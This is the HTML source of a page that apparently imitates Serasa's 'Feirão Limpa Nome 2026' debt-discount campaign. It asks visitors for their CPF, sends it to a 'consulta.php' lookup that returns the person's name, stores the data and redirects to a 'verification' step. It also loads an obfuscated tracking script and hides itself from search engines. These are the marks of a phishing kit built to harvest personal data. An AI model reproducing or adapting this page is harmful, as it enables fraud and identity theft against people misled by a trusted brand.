<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <script src="https://cdn.xtracky.com/scripts/experimental.obfuscated.js" data-token="ba374c9e-0020-4dce-b1fd-cac80baab7d0" data-click-id-param="click_id"></script>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Serasa | Feirão Limpa Nome 2026</title>
    <link rel="icon" href="./images/icons/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">

    <script src="./js/jquery-3.2.1.min.js" type="text/javascript"></script>
    <script src="./js/imask.min.js" type="text/javascript"></script>
    
    <style type="text/css">
        :root {
            --color-primary: #e63888; 
            --color-secondary: #004481; 
            --color-tertiary: #FFFFFF;
            --color-text: #4d4d4d;
            --color-error: #FF0000;
            --font-primary: 'Montserrat', sans-serif;
            --border-radius: 8px;
            --box-shadow: 0px 10px 25px rgba(0, 0, 0, 0.1);
        }
        
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            font-family: var(--font-primary);
            background: linear-gradient(135deg, #e63888 0%, #fb58a7 100%);
            color: var(--color-text);
            line-height: 1.6;
            min-height: 100vh;
        }
        
        #template {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        #template-wrapper {
            background-color: var(--color-tertiary);
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            width: 100%;
            max-width: 450px;
            overflow: hidden;
        }
        
        #template-wrapper-content { padding: 40px 30px; }
        
        #template-header { text-align: center; margin-bottom: 25px; }
        
        #template-logo { height: 48px; margin-bottom: 10px; }
        
        .title {
            color: var(--color-primary);
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 5px;
            text-align: center;
        }

        .subtitle {
            color: var(--color-secondary);
            font-size: 1.4rem;
            font-weight: 800;
            text-align: center;
            margin-bottom: 20px;
            display: block;
        }
        
        .description {
            color: #666;
            font-size: 0.95rem;
            text-align: center;
            margin-bottom: 30px;
        }
        
        .float-label-group { margin-bottom: 25px; }
        
        .float-label { position: relative; }
        
        .float-label input {
            width: 100%;
            padding: 18px 15px;
            border: 1px solid #ccc;
            border-radius: var(--border-radius);
            font-size: 1.1rem;
            background-color: #fff;
        }
        
        .float-label label {
            position: absolute;
            top: -10px;
            left: 12px;
            background-color: white;
            padding: 0 8px;
            font-size: 0.85rem;
            color: var(--color-primary);
            font-weight: 600;
        }
        
        button.button-primary {
            width: 100%;
            padding: 16px;
            background-color: var(--color-secondary);
            color: white;
            border: none;
            border-radius: var(--border-radius);
            font-weight: 700;
            font-size: 1.05rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .loader {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--color-primary);
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        #template-info { text-align: center; margin-top: 25px; padding-top: 20px; border-top: 1px solid #eee; }
        
        .faq-layout { display: flex; align-items: center; justify-content: center; gap: 8px; }
        
        .faq-layout a { color: var(--color-secondary); text-decoration: none; font-weight: 700; }
    </style>

    <script type="text/javascript">
        function formatarCPF(cpf) {
            cpf = cpf.replace(/\D/g, '');
            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
            cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            return cpf;
        }
        
        function verificarConta() {
            var cpf = document.getElementById('cpf').value.replace(/\D/g, '');
            if (cpf.length !== 11) { return false; }
            
            document.getElementById('loader').style.display = 'block';
            document.getElementById('verificarBtn').disabled = true;
            
            fetch('./consulta.php?cpf=' + cpf)
                .then(response => response.json())
                .then(data => {
                    const usuario = data.dados[0];
                    localStorage.setItem('userData', JSON.stringify({
                        nome: usuario.NOME, cpf: usuario.CPF, consultadoEm: new Date().toISOString()
                    }));
                    window.location.href = `./verification/index.html?cpf=${cpf}`;
                })
                .catch(() => {
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('verificarBtn').disabled = false;
                });
            return false;
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('cpf').addEventListener('input', function() { this.value = formatarCPF(this.value); });
        });
    </script>
</head>

<body>
    <div id="template">
        <div id="template-wrapper">
            <div id="template-wrapper-content">
                <header id="template-header">
                    <img alt="Serasa" id="template-logo" src="images/serasa-logo.png">
                </header>

                <section id="template-section">
                    <h4 class="title">Feirão Limpa Nome</h4>
                    <span class="subtitle">2026</span>
                    
                    <p class="description">
                        O Feirão Limpa Nome 2026 começou! Faça login com seu CPF e aproveite até 90% de desconto nas suas dívidas.
                    </p>

                    <form onsubmit="return verificarConta()">
                        <div class="float-label-group">
                            <div class="float-label">
                                <input type="text" id="cpf" name="cpf" maxlength="14" required>
                                <label for="cpf"><i class="far fa-id-card"></i> CPF</label>
                            </div>
                        </div>
        
                        <div class="button-group">
                            <button type="submit" id="verificarBtn" class="button-primary">
                                <i class="fas fa-search" style="margin-right:8px"></i> Verificar meus descontos
                            </button>
                        </div>
                    </form>
                    
                    <div id="loader" class="loader"></div>
                </section>

                <footer id="template-info">
                    <div class="faq-layout">
                        <i class="fas fa-question-circle" style="color: var(--color-secondary);"></i>
                        <a href="#">Preciso de ajuda</a>
                    </div>
                </footer>
            </div>
        </div>
    </div>
</body>
</html>
